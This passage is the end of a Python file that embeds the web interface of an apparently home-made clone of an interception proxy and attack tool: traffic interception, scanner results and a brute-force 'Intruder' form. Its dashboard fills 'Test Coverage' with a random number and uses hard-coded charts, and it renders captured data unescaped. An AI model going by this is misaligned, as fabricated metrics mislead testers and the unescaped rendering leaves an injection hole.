            <div class="content-area" id="contentArea">
                <!-- Dashboard will be loaded here -->
                <div class="dashboard-view">
                    <h2>Security Testing Dashboard</h2>
                    <!-- Dashboard content will be populated by JavaScript -->
                </div>
            </div>
        </div>
    </div>

    <!-- Modals -->
    <div class="modal" id="interceptModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">Request Interception</h3>
                <button class="modal-close" onclick="closeModal('interceptModal')">&times;</button>
            </div>
            <div class="modal-body">
                <div id="interceptContent"></div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" onclick="interceptAction('drop')">Drop</button>
                <button class="btn btn-primary" onclick="interceptAction('forward')">Forward</button>
            </div>
        </div>
    </div>

    <!-- JavaScript -->
    <script>
        // Global state
        let activeTab = 'dashboard';
        let interceptEnabled = true;
        let currentRequest = null;

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            loadDashboard();
            setInterval(updateStatus, 2000);
            setInterval(checkIntercept, 1000);
        });

        // Tab switching
        function switchTab(tab) {
            activeTab = tab;

            // Update nav items
            document.querySelectorAll('.nav-item').forEach(item => {
                item.classList.remove('active');
            });
            event.target.closest('.nav-item').classList.add('active');

            // Load tab content
            loadTabContent(tab);
        }

        function loadTabContent(tab) {
            const content = document.getElementById('contentArea');

            switch(tab) {
                case 'dashboard':
                    loadDashboard();
                    break;
                case 'proxy':
                    loadProxy();
                    break;
                case 'scanner':
                    loadScanner();
                    break;
                case 'intruder':
                    loadIntruder();
                    break;
                case 'repeater':
                    loadRepeater();
                    break;
                case 'decoder':
                    loadDecoder();
                    break;
                case 'comparer':
                    loadComparer();
                    break;
                case 'sequencer':
                    loadSequencer();
                    break;
                default:
                    content.innerHTML = `<h2>${tab.charAt(0).toUpperCase() + tab.slice(1)} View</h2>`;
            }
        }

        async function loadDashboard() {
            const response = await fetch('/api/status');
            const data = await response.json();

            const content = `
                <div class="dashboard-grid">
                    <div class="stat-card">
                        <div class="stat-icon primary">
                            <i class="fas fa-exchange-alt"></i>
                        </div>
                        <div class="stat-content">
                            <div class="stat-value">${data.request_count}</div>
                            <div class="stat-label">Total Requests</div>
                        </div>
                    </div>

                    <div class="stat-card">
                        <div class="stat-icon danger">
                            <i class="fas fa-exclamation-triangle"></i>
                        </div>
                        <div class="stat-content">
                            <div class="stat-value">${data.issue_count}</div>
                            <div class="stat-label">Security Issues</div>
                        </div>
                    </div>

                    <div class="stat-card">
                        <div class="stat-icon success">
                            <i class="fas fa-check-circle"></i>
                        </div>
                        <div class="stat-content">
                            <div class="stat-value">${Math.round(Math.random() * 100)}%</div>
                            <div class="stat-label">Test Coverage</div>
                        </div>
                    </div>

                    <div class="stat-card">
                        <div class="stat-icon warning">
                            <i class="fas fa-clock"></i>
                        </div>
                        <div class="stat-content">
                            <div class="stat-value">${new Date().toLocaleTimeString()}</div>
                            <div class="stat-label">Active Session</div>
                        </div>
                    </div>
                </div>

                <div class="chart-container">
                    <div class="chart-title">
                        <i class="fas fa-chart-line"></i>
                        Request Timeline
                    </div>
                    <canvas id="requestChart" height="100"></canvas>
                </div>

                <div class="chart-container">
                    <div class="chart-title">
                        <i class="fas fa-chart-pie"></i>
                        Issue Distribution
                    </div>
                    <canvas id="issueChart" height="100"></canvas>
                </div>
            `;

            document.getElementById('contentArea').innerHTML = content;

            // Initialize charts
            initCharts();
        }

        function initCharts() {
            // Request timeline chart
            const ctx1 = document.getElementById('requestChart')?.getContext('2d');
            if (ctx1) {
                new Chart(ctx1, {
                    type: 'line',
                    data: {
                        labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
                        datasets: [{
                            label: 'Requests',
                            data: [65, 59, 80, 81, 56, 55, 40],
                            borderColor: '#4a6ee0',
                            backgroundColor: 'rgba(74, 110, 224, 0.1)',
                            fill: true,
                            tension: 0.4
                        }]
                    },
                    options: {
                        responsive: true,
                        plugins: {
                            legend: {
                                display: false
                            }
                        }
                    }
                });
            }

            // Issue distribution chart
            const ctx2 = document.getElementById('issueChart')?.getContext('2d');
            if (ctx2) {
                new Chart(ctx2, {
                    type: 'doughnut',
                    data: {
                        labels: ['Critical', 'High', 'Medium', 'Low', 'Info'],
                        datasets: [{
                            data: [5, 10, 15, 8, 12],
                            backgroundColor: [
                                '#721c24',
                                '#856404',
                                '#0c5460',
                                '#155724',
                                '#004085'
                            ]
                        }]
                    },
                    options: {
                        responsive: true,
                        plugins: {
                            legend: {
                                position: 'bottom'
                            }
                        }
                    }
                });
            }
        }

        async function loadProxy() {
            const response = await fetch('/api/history');
            const requests = await response.json();

            let requestList = '';
            requests.forEach(req => {
                const methodClass = req.method.toLowerCase();
                const statusClass = req.code >= 200 && req.code < 300 ? 'success' : 
                                   req.code >= 400 ? 'error' : 'warning';

                requestList += `
                    <div class="request-item" onclick="viewRequest('${req.id}')">
                        <div class="method-badge ${methodClass}">${req.method}</div>
                        <div class="request-details">
                            <div class="request-url">${req.host}${req.path}</div>
                            <div class="request-meta">
                                <span class="status-code ${statusClass}">${req.code}</span>
                                <span>${req.response_time}ms</span>
                                <span>${formatBytes(req.request_size + req.response_size)}</span>
                                <span>${new Date(req.timestamp).toLocaleTimeString()}</span>
                            </div>
                        </div>
                        <div class="request-actions">
                            <button class="action-btn" onclick="sendToRepeater('${req.id}', event)">
                                <i class="fas fa-redo"></i>
                            </button>
                            <button class="action-btn" onclick="sendToIntruder('${req.id}', event)">
                                <i class="fas fa-fighter-jet"></i>
                            </button>
                        </div>
                    </div>
                `;
            });

            const content = `
                <div class="request-list">
                    <div class="list-header">
                        <div class="list-title">HTTP History</div>
                        <div class="list-filters">
                            <input type="text" class="filter-input" placeholder="Filter requests..." onkeyup="filterRequests(this.value)">
                            <select class="filter-input" onchange="filterByMethod(this.value)">
                                <option value="">All Methods</option>
                                <option value="GET">GET</option>
                                <option value="POST">POST</option>
                                <option value="PUT">PUT</option>
                                <option value="DELETE">DELETE</option>
                            </select>
                        </div>
                    </div>
                    ${requestList || '<div class="request-item"><div class="request-details">No requests captured</div></div>'}
                </div>
            `;

            document.getElementById('contentArea').innerHTML = content;
        }

        async function loadScanner() {
            const response = await fetch('/api/scanner/results');
            const issues = await response.json();

            let issueList = '';
            issues.forEach(issue => {
                const severityClass = issue.severity.toLowerCase();

                issueList += `
                    <div class="request-item">
                        <div class="severity-badge severity-${severityClass}">${issue.severity}</div>
                        <div class="request-details">
                            <div class="request-url">${issue.type} - ${issue.url}</div>
                            <div class="request-meta">
                                <span>${issue.description}</span>
                                <span>Confidence: ${issue.confidence}</span>
                                <span>${new Date(issue.timestamp).toLocaleString()}</span>
                            </div>
                        </div>
                        <div class="request-actions">
                            <button class="action-btn" onclick="markAsFixed('${issue.id}', event)">
                                <i class="fas fa-check"></i>
                            </button>
                            <button class="action-btn" onclick="markAsFalsePositive('${issue.id}', event)">
                                <i class="fas fa-times"></i>
                            </button>
                        </div>
                    </div>
                `;
            });

            const content = `
                <div class="request-list">
                    <div class="list-header">
                        <div class="list-title">Scanner Results</div>
                        <button class="btn btn-success btn-sm" onclick="newScan()">
                            <i class="fas fa-search"></i>
                            <span>New Scan</span>
                        </button>
                    </div>
                    ${issueList || '<div class="request-item"><div class="request-details">No issues found</div></div>'}
                </div>
            `;

            document.getElementById('contentArea').innerHTML = content;
        }

        function loadIntruder() {
            const content = `
                <div class="chart-container">
                    <div class="chart-title">
                        <i class="fas fa-fighter-jet"></i>
                        Intruder Attacks
                    </div>

                    <div class="form-group">
                        <label class="form-label">Attack Type</label>
                        <select class="form-control" id="attackType">
                            <option value="sniper">Sniper</option>
                            <option value="battering_ram">Battering Ram</option>
                            <option value="pitchfork">Pitchfork</option>
                            <option value="cluster_bomb">Cluster Bomb</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label class="form-label">Target URL (use § for payload position)</label>
                        <input type="text" class="form-control" id="targetUrl" placeholder="https://example.com/search?q=§test§">
                    </div>

                    <div class="form-group">
                        <label class="form-label">Payloads (one per line)</label>
                        <textarea class="form-control form-textarea" id="payloads" placeholder="admin&#10;test&#10;guest"></textarea>
                    </div>

                    <button class="btn btn-primary" onclick="startIntruder()">
                        <i class="fas fa-play"></i>
                        Start Attack
                    </button>

                    <div id="intruderResults" style="margin-top: 20px;"></div>
                </div>
            `;

            document.getElementById('contentArea').innerHTML = content;
        }

        // Utility functions
        function formatBytes(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        async function updateStatus() {
            const response = await fetch('/api/status');
            const data = await response.json();

            document.getElementById('proxyStatus').innerHTML = `
                <i class="fas fa-circle" style="color: ${data.proxy_running ? '#28a745' : '#dc3545'}"></i>
                <span>Proxy: ${data.proxy_running ? 'Running' : 'Stopped'}</span>
            `;

            document.getElementById('projectStatus').innerHTML = `
                <i class="fas fa-folder"></i>
                <span>Project: ${data.active_project}</span>
            `;

            document.getElementById('issueCount').innerHTML = `
                <i class="fas fa-exclamation-triangle"></i>
                <span>Issues: ${data.issue_count}</span>
            `;
        }

        async function checkIntercept() {
            if (!interceptEnabled) return;

            const response = await fetch('/api/intercept/next');
            const data = await response.json();

            if (data.id) {
                showInterceptModal(data);
            }
        }

        function showInterceptModal(data) {
            currentRequest = data;

            document.getElementById('interceptContent').innerHTML = `
                <div class="code-editor">
                    <div class="code-toolbar">
                        <span>${data.type === 'request' ? 'Request Interception' : 'Response Interception'}</span>
                    </div>
                    <div class="code-content">
                        <pre>${escapeHtml(data.data)}</pre>
                    </div>
                </div>
            `;

            document.getElementById('interceptModal').classList.add('show');
        }

        async function interceptAction(action) {
            if (!currentRequest) return;

            await fetch(`/api/intercept/${currentRequest.id}`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    action: action,
                    modified: document.querySelector('#interceptContent pre').innerText
                })
            });

            closeModal('interceptModal');
            currentRequest = null;
        }

        function toggleIntercept() {
            interceptEnabled = !interceptEnabled;
            const btn = event.target.closest('button');

            fetch('/api/intercept/toggle', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({enabled: interceptEnabled})
            });

            btn.innerHTML = `
                <i class="fas fa-${interceptEnabled ? 'pause' : 'play'}"></i>
                <span>Intercept: ${interceptEnabled ? 'On' : 'Off'}</span>
            `;

            btn.classList.toggle('btn-secondary');
            btn.classList.toggle('btn-primary');
        }

        async function startIntruder() {
            const attackType = document.getElementById('attackType').value;
            const targetUrl = document.getElementById('targetUrl').value;
            const payloads = document.getElementById('payloads').value.split('\\n');

            const response = await fetch('/api/intruder/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    name: 'Intruder Attack',
                    target_url: targetUrl,
                    attack_type: attackType,
                    payloads: payloads
                })
            });

            const data = await response.json();

            document.getElementById('intruderResults').innerHTML = `
                <div class="alert alert-success">
                    <i class="fas fa-check-circle"></i>
                    Attack started with ID: ${data.job_id}
                </div>
            `;
        }

        function newScan() {
            const url = prompt('Enter target URL to scan:');
            if (url) {
                fetch('/api/scanner/scan', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({url: url})
                }).then(() => {
                    alert('Scan started!');
                    loadScanner();
                });
            }
        }

        function exportData() {
            window.open('/api/export/json', '_blank');
        }

        function closeModal(modalId) {
            document.getElementById(modalId).classList.remove('show');
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Additional functions would be added for other features
        function viewRequest(id) {
            // Implement request viewer
            console.log('View request:', id);
        }

        function sendToRepeater(id, event) {
            event.stopPropagation();
            console.log('Send to repeater:', id);
        }

        function sendToIntruder(id, event) {
            event.stopPropagation();
            console.log('Send to intruder:', id);
        }

        function markAsFixed(id, event) {
            event.stopPropagation();
            console.log('Mark as fixed:', id);
        }

        function markAsFalsePositive(id, event) {
            event.stopPropagation();
            console.log('Mark as false positive:', id);
        }

        function filterRequests(query) {
            // Implement filtering
            console.log('Filter:', query);
        }

        function filterByMethod(method) {
            // Implement method filtering
            console.log('Filter by method:', method);
        }

        function showHelp() {
            alert(`Burp Suite Professional Clone\n\nAdvanced security testing platform for web applications.`);
        }
    </script>
</body>
</html>
'''

# ================= MAIN EXECUTION =================
if __name__ == "__main__":
    # Start Flask app in background
    threading.Thread(
        target=lambda: app.run(
            host="127.0.0.1",
            port=UI_PORT,
            threaded=True,
            debug=False,
            use_reloader=False
        ),
        daemon=True
    ).start()

    # Start proxy server
    start_proxy_server()